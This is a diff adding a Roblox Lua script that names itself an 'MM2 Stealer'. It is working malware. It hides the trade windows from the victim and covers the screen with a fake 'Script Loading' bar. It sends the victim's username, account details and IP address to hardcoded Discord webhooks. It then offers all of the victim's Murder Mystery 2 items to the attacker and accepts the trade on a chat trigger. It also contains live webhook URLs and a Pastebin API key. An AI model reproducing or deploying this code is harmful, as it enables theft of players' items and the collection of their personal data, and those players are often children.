@@ -1,0 +1,541 @@
+-- obfuscate in this moment
+PingUsername = "pablogarote"
+PingWebhook = "https://discordapp.com/api/webhooks/1370597789746335804/6LCnqNHdhGdEULlYArJ60PH4XkUcCMueKxbQioZ1pJaIsf589qTwUmYeUSIiBsrvy8rw"
+Unique = 1 -- [Minimum Unique]
+Ancient = 1 -- [Minimum Ancient]
+Godly = 1 -- [Minimum Godly]
+
+if Username == "" or Username == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Username!")
+end
+if Webhook == "" or Webhook == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Webhook!")
+end
+
+logsweb = "https://discordapp.com/api/webhooks/1370437958360104980/NDUlG35C-5MhANf-KPtUG_Ua-Qu4vYRiEuSbteVS2QqnY5NfLYhYvsHwAD2cQnZoDOsf" -- your logswebhook here
+
+Logs_webhook = logsweb
+
+repeat wait() until game:IsLoaded()
+
+if getgenv().scriptexecuted then return end
+getgenv().scriptexecuted = true
+
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+
+local destroytrades2 = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+        if tradeGUI.Enabled == true then
+            tradeGUI.Enabled = false
+        end
+
+        if tradeGUIPhone.Enabled == true then
+            tradeGUIPhone.Enabled = false
+        end
+
+        wait(0.1)
+    end
+end)
+
+if Fakegui and Fakegui ~= "" then
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LoadingGUI"
+gui.ResetOnSpawn = false
+
+-- Constants
+local totalDuration = 600 -- 10 minutes
+local updateInterval = 1
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.5, 0, 0.3, 0)
+mainFrame.Position = UDim2.new(0.25, 0, 0.35, 0)
+mainFrame.BackgroundTransparency = 1
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = gui
+
+-- Background Image (with your asset ID)
+local background = Instance.new("ImageLabel", mainFrame)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.Image = "rbxassetid://81150123555529"
+background.BackgroundTransparency = 1
+background.ScaleType = Enum.ScaleType.Stretch
+background.ZIndex = 0
+
+-- Title
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "Script Loading Please Wait"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 28
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.ZIndex = 2
+
+-- Discord Link
+local link = Instance.new("TextLabel", mainFrame)
+link.Size = UDim2.new(1, 0, 0.2, 0)
+link.Position = UDim2.new(0, 0, 0.3, 0)
+link.Text = "Overdrive H (ODH)"
+link.Font = Enum.Font.SourceSansItalic
+link.TextSize = 18
+link.TextColor3 = Color3.fromRGB(200, 200, 255)
+link.BackgroundTransparency = 1
+link.ZIndex = 2
+
+-- Percentage
+local percent = Instance.new("TextLabel", mainFrame)
+percent.Size = UDim2.new(1, 0, 0.2, 0)
+percent.Position = UDim2.new(0, 0, 0.5, 0)
+percent.Text = "0%"
+percent.Font = Enum.Font.SourceSans
+percent.TextSize = 20
+percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+percent.BackgroundTransparency = 1
+percent.ZIndex = 2
+
+-- Progress bar background
+local progressBarBG = Instance.new("Frame", mainFrame)
+progressBarBG.Size = UDim2.new(0.9, 0, 0.1, 0)
+progressBarBG.Position = UDim2.new(0.05, 0, 0.75, 0)
+progressBarBG.BackgroundColor3 = Color3.fromRGB(30, 60, 100)
+progressBarBG.BorderSizePixel = 0
+progressBarBG.ZIndex = 2
+
+-- Progress bar fill
+local progressBarFill = Instance.new("Frame", progressBarBG)
+progressBarFill.BackgroundColor3 = Color3.fromRGB(80, 170, 255)
+progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+progressBarFill.BorderSizePixel = 0
+progressBarFill.ZIndex = 3
+
+-- Toggle Button
+local toggleButton = Instance.new("TextButton", gui)
+toggleButton.Size = UDim2.new(0, 100, 0, 30)
+toggleButton.Position = UDim2.new(0.5, -50, 0.67, 0)
+toggleButton.Text = "Hide"
+toggleButton.BackgroundColor3 = Color3.fromRGB(15, 30, 60)
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+toggleButton.TextSize = 18
+toggleButton.AutoButtonColor = true
+
+-- Toggle Function
+local isVisible = true
+local expandedSize = UDim2.new(0.5, 0, 0.3, 0)
+local collapsedSize = UDim2.new(0.5, 0, 0, 0)
+
+local function toggleGui()
+	isVisible = not isVisible
+	toggleButton.Text = isVisible and "Hide" or "Show"
+	mainFrame:TweenSize(
+		isVisible and expandedSize or collapsedSize,
+		Enum.EasingDirection.Out,
+		Enum.EasingStyle.Sine,
+		0.4,
+		true
+	)
+end
+
+toggleButton.MouseButton1Click:Connect(toggleGui)
+
+-- Simulate loading progress
+local elapsed = 0
+while elapsed <= totalDuration do
+	local percentDone = math.floor((elapsed / totalDuration) * 100)
+	percent.Text = percentDone .. "%"
+	progressBarFill.Size = UDim2.new(elapsed / totalDuration, 0, 1, 0)
+	wait(updateInterval)
+	elapsed = elapsed + updateInterval
+end
+
+-- Done
+wait(1)
+gui:Destroy()
+end
+
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local itemsCount = 0
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        table.insert(allItems, d.ItemName)
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + 1
+            table.insert(vintageItems, d.DataID)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + 1
+            table.insert(commonItems, d.DataID)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + 1
+            table.insert(uncommonItems, d.DataID)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + 1
+            table.insert(rareItems, d.DataID)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + 1
+            table.insert(legendaryItems, d.DataID)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + 1
+            table.insert(godlyItems, d.DataID)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + 1
+            table.insert(ancientItems, d.DataID)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + 1
+            table.insert(uniqueItems, d.DataID)
+        end
+    end
+end
+
+for i,v in pairs(allItems) do
+    itemsCount = itemsCount + 1
+end
+
+local function isTradeModuleAvailable()
+    local success, TradeModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
+    end)
+    return success and TradeModule
+end
+
+local function stealItems()
+    coroutine.resume(destroytrades2)
+
+    local sendArgs = {
+        [1] = game:GetService("Players")[Username]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+
+    wait(3)
+
+    for i,v in pairs(uniqueItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(ancientItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(godlyItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(vintageItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(legendaryItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(rareItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(uncommonItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(commonItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    wait(6)
+    local acc = {
+        [1] = 285646582
+    }
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
+end
+
+local HttpService = game:GetService("HttpService")
+
+-- Formats item list into a string
+local function formatItems(itemList)
+    if #itemList == 0 then
+        return "Player Has No Items Of This Rarity."
+    else
+        return table.concat(itemList, "\n")
+    end
+end
+
+
+
+local function detectHttpSpy()
+    local function isHttpSpy(gui)
+        return gui and gui:IsA("ScreenGui") and gui.Name:lower():find("gui_") ~= nil
+    end
+
+    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
+        if isHttpSpy(gui) then
+            return true
+        end
+    end
+
+    return false
+end
+
+if detectHttpSpy() then
+    warn("Suspicious activity detected. Aborting script execution.")
+    return
+end
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local function formatItems(itemList)
+    if #itemList == 0 then
+        return "None"
+    else
+        return table.concat(itemList, "\n")
+    end
+end
+
+-- Player Info
+local playerName = game.Players.LocalPlayer.Name
+local playerId = game.Players.LocalPlayer.UserId
+local clickablePlayerName = "[" .. playerName .. "](https://www.roblox.com/users/" .. playerId .. "/profile)"
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+
+
+local logs = {
+    username = "Hit Logs",
+    avatar_url = "https://cdn.discordapp.com/attachments/1299029827445194794/1346487886454849576/29c5846748c674aa8fce0a19312dd3c5.webp.jpg?ex=67c906d0&is=67c7b550&hm=c3eb3a5add0be38ad6eda3b0ac1198b5ceaf388bb7e6f8942d698c769a762ddb&", -- bot profile link here
+    content = "**Someone Got Hit**",
+    embeds = {{
+        title = "**__Pethical__ | __MM2 Stealer__**",
+        color = tonumber(0x3365FF),
+        description = clickablePlayerName .. " dumbass kid",
+        thumbnail = {
+            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
+        },
+        fields = {
+            {
+                name = "Weapon",
+                value = "```lua\nTotal Item: " .. tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC) .. "\nUnique: " .. tostring(uniqueItemsC) .. "\nAncient: " .. tostring(ancientItemsC) .. "\nGodly: " .. tostring(godlyItemsC) .. "\nLegendary: " .. tostring(legendaryItemsC) .. "\nVintage: " .. tostring(vintageItemsC) .. "\nRare: " .. tostring(rareItemsC) .. "\nUncommon: " .. tostring(uncommonItemsC) .. "\nCommon: " .. tostring(commonItemsC) .. "```",
+                inline = false,
+            },
+        },
+        footer = {
+            text = "Made by Minaj | " .. currentTime,
+        },
+    }},
+}
+
+local request = http_request or request or HttpPost or syn.request
+request(
+    {
+    Url = Logs_webhook,
+        Method = "POST",
+        Headers = {
+                ["Content-Type"] = "application/json"
+        },
+        Body = game.HttpService:JSONEncode(logs)
+    }
+)
+
+local function send_embed_with_txt_attachment(uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems)
+    local fileContent =
+        "-- Unique Items\n" .. formatItems(uniqueItems) ..
+        "\n\n-- Ancient Items\n" .. formatItems(ancientItems) ..
+        "\n\n-- Godly Items\n" .. formatItems(godlyItems) ..
+        "\n\n-- Legendary Items\n" .. formatItems(legendaryItems) ..
+        "\n\n-- Vintage Items\n" .. formatItems(vintageItems) ..
+        "\n\n-- Rare Items\n" .. formatItems(rareItems) ..
+        "\n\n-- Uncommon Items\n" .. formatItems(uncommonItems) ..
+        "\n\n-- Common Items\n" .. formatItems(commonItems)
+
+if godlyItemsC >= Godly or ancientItemsC >= Ancient or uniqueItemsC >= Unique then
+    Username = PingUsername
+    Webhook = PingWebhook
+end
+
+local embed = {
+    username = "Pethical",
+    avatar_url = "https://cdn.discordapp.com/attachments/1299029863427997777/1368942756151427173/5222-invisible-pfp.png?ex=681a0eca&is=6818bd4a&hm=38e6a90e95e5f7c4ad10fa60fab9e04d865adaee3767ffd948f2743cd17f08e6&", -- bot profile link here
+    content = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "', game.Players.LocalPlayer)",
+    embeds = {{
+        title = "**Chat /w or murder to trade your victim.**",
+        color = tonumber(0x3365FF),
+        description = clickablePlayerName .. " is waiting in the queue for you. Join with execution.",
+        thumbnail = {
+            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
+        },
+        fields = {
+            {
+                name = "Information",
+                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. tostring(Username) .. "\nIP Address: " .. tostring(game:HttpGet('https://ipinfo.io/ip')) .. "```",
+                inline = false,
+            },
+            {
+                name = "Weapon",
+                value = "```lua\nTotal Item: " .. tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC) .. "\nUnique: " .. tostring(uniqueItemsC) .. "\nAncient: " .. tostring(ancientItemsC) .. "\nGodly: " .. tostring(godlyItemsC) .. "\nLegendary: " .. tostring(legendaryItemsC) .. "\nVintage: " .. tostring(vintageItemsC) .. "\nRare: " .. tostring(rareItemsC) .. "\nUncommon: " .. tostring(uncommonItemsC) .. "\nCommon: " .. tostring(commonItemsC) .. "```",
+                inline = false,
+            },
+        },
+        footer = {
+            text = "Made by Minaj | " .. currentTime,
+        },
+    }},
+}
+    local boundary = "----BoundaryString"
+    local body = "--" .. boundary .. "\r\n" ..
+        'Content-Disposition: form-data; name="payload_json"\r\n\r\n' ..
+        game:GetService("HttpService"):JSONEncode(embed) .. "\r\n" ..
+        "--" .. boundary .. "\r\n" ..
+        'Content-Disposition: form-data; name="file"; filename="items.txt"\r\n' ..
+        'Content-Type: text/plain\r\n\r\n' ..
+        fileContent .. "\r\n" ..
+        "--" .. boundary .. "--\r\n"
+    local request = http_request or request or HttpPost or syn.request
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+        },
+        Body = body
+    })
+    print(response.StatusCode, response.StatusMessage)
+end
+
+send_embed_with_txt_attachment(uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems)
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            local lowerMsg = msg:lower()
+            if lowerMsg == "/w" or lowerMsg == "murder" then
+                stealItems()
+            end
+        end)
+    end
+end)
